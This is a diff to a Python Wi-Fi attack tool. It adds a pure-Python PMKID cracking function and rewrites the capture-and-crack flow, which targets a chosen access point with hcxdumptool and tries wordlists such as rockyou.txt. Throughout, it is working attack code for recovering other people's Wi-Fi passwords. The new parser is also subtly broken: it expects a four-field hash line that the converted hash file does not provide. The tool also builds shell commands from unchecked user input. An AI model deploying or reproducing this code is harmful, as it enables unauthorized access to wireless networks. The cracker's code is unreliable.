@@ -1,7 +1,10 @@
 import os
 import time
 import subprocess
+import hashlib
+import hmac
 from subprocess import check_call
+from binascii import unhexlify
 
 interface = None
 
@@ -98,6 +101,39 @@ def show_networks():
     os.system(f"airodump-ng {interface}")
 
 
+def python_crack_pmkid(hashfile: str, wordlist: str):
+    """
+    Crack a PMKID hash using pure Python.
+    Format: <AP-MAC>*<STA-MAC>*<PMKID>*<SSID>
+    """
+    try:
+        line = open(hashfile, "r", errors="ignore").readline().strip()
+        ap_mac, sta_mac, pmkid_hex, ssid = line.split('*')
+        ap_bytes = unhexlify(ap_mac.replace(':', ''))
+        sta_bytes = unhexlify(sta_mac.replace(':', ''))
+        pmkid_target = unhexlify(pmkid_hex)
+    except Exception as e:
+        print(f"[!] Error parsing PMKID hash: {e}")
+        return None
+
+    try:
+        with open(wordlist, "r", errors="ignore") as f:
+            for password in f:
+                password = password.strip()
+                # Derive PMK using PBKDF2-HMAC-SHA1
+                pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), 4096, 32)
+                # Compute HMAC-SHA1 over b"PMK Name" + AP_MAC + STA_MAC
+                pmkid_calc = hmac.new(pmk, b"PMK Name" + ap_bytes + sta_bytes, hashlib.sha1).digest()[:16]
+                if pmkid_calc == pmkid_target:
+                    print(f"[+] Password found: {password}")
+                    return password
+    except FileNotFoundError:
+        print("[!] Wordlist not found.")
+        return None
+
+    print("[-] Password not found in the wordlist.")
+    return None
+
 def pmkid_attack():
     global interface
     if interface is None:
@@ -113,40 +149,48 @@ def pmkid_attack():
     print("\nStarting hcxdumptool to capture PMKID... Press CTRL+C to stop.")
     time.sleep(3)
     os.system(f"hcxdumptool -i {interface} --enable_status=1 -o pmkid.pcapng --filterlist_ap={bssid} --filtermode=2")
-    
-    pmkid_path = os.path.join(os.getcwd(), "pmkid.pcapng")
-    print(f"\nPMKID captured. Check at {pmkid_path}\n")
-    time.sleep(5)
 
+    pmkid_path = os.path.join(os.getcwd(), "pmkid.pcapng")
+    print(f"\nPMKID captured. Saved at {pmkid_path}\n")
+    time.sleep(2)
+
+    # Convert to 22000 format using hcxpcapngtool (still needed)
+    print("[+] Converting pcapng to hash file...")
+    subprocess.run(["hcxpcapngtool", "-o", "pmkid.22000", pmkid_path], check=True)
+    hashfile = "pmkid.22000"
+
+    # Choose wordlist
     print("\n[1] Crack PMKID using existing wordlist")
     print("[2] Crack PMKID using custom wordlist")
     choice = input("\n[+] Enter the number: ").strip()
 
     if choice == "1":
-        rockyou_path = "./rockyou.txt"
-        rockyou_gz_path = "./rockyou.txt.gz"
-        if not os.path.exists(rockyou_path):
-            if os.path.exists(rockyou_gz_path):
-                print("\nExtracting rockyou.txt ...")
-                os.system(f"gzip -d {rockyou_gz_path}")
-            else:
-                print("\n[!] rockyou.txt or rockyou.txt.gz not found!")
-                return
-        print("\nTo exit Press CTRL +C")
-        os.system(f"hcxpcapngtool -o pmkid.22000 {pmkid_path}")
-        os.system(f"hashcat -m 22000 pmkid.22000 {rockyou_path}")
-    elif choice == "2":
-        wordlist = input("\nEnter the path of the wordlist file: ").strip()
+        wordlist = "./rockyou.txt"
+        gz_path = "./rockyou.txt.gz"
         if not os.path.exists(wordlist):
-            print("\n[!] Wordlist file not found!")
+            if os.path.exists(gz_path):
+                print("[+] Extracting rockyou.txt.gz ...")
+                os.system(f"gzip -d {gz_path}")
+            else:
+                print("[!] rockyou.txt or rockyou.txt.gz not found!")
+                return
+    elif choice == "2":
+        wordlist = input("\nEnter the full path to the wordlist: ").strip()
+        if not os.path.exists(wordlist):
+            print("[!] Wordlist not found!")
             return
-        print("\nTo exit Press CTRL +C")
-        os.system(f"hcxpcapngtool -o pmkid.22000 {pmkid_path}")
-        os.system(f"hashcat -m 22000 pmkid.22000 {wordlist}")
     else:
-        print("\n[!] Invalid option. Please enter 1 or 2.")
-        pmkid_attack()
-    time.sleep(15)
+        print("[!] Invalid choice.")
+        return
+
+    print("\n[+] Cracking PMKID with Python...")
+    result = python_crack_pmkid(hashfile, wordlist)
+    if result:
+        print(f"[✔] Success! Cracked password: {result}")
+    else:
+        print("[✘] Failed to crack the PMKID.")
+
+    time.sleep(10)
     main()
 
 
